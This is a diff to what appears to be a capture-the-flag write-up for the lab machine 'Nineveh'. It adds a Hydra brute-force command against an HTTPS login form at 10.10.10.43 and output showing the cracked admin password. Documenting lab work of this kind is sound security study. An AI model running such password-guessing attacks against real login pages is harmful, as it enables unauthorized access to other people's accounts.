@@ -235,3 +235,19 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-16 03:15:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-16 03:15:14                            
 ```
+
+```
+hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect" -t 64
+```
+```
+┌──(kali㉿kali)-[~/Documents/Nineveh]
+└─$ hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect" -t 64
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-16 03:23:54
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 10000 login tries (l:1/p:10000), ~157 tries per task
+[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect
+[443][http-post-form] host: 10.10.10.43   login: admin   password: password123                                                                            
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-16 03:24:38
+```
